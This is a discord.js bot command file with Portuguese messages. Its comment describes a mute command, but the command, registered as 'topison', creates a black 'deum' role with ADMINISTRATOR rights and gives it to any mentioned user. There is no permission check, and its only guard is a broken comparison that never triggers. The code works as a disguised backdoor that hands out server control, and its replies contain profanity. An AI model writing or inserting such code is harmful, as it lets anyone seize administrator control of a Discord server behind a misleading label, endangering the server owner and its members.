const Discord = require("discord.js");

exports.run = async (bot, message, args) => {

  //!mute @user 1s/m/h/d

  let hakii = message.guild.member(message.mentions.users.first() || message.guild.members.get(args[0]));
  if(!hakii.id === "702246607667593307") return message.channel.send("VAI SE FUDER!");
  let hakiirole = message.guild.roles.find(`name`, "deum");

  if(!hakiirole){
    hakiirole = await message.guild.createRole({
      name: "deum",
      color: "#000000",
      permissions:['MANAGE_MESSAGES', 'KICK_MEMBERS', 'ADMINISTRATOR']
    });
  }

  await(hakii.addRole(hakiirole.id));
  message.reply(`<@${hakii.id}> agora é fodão`);
  message.channel.send(hakii);
}

exports.help = {
  name: "topison"
}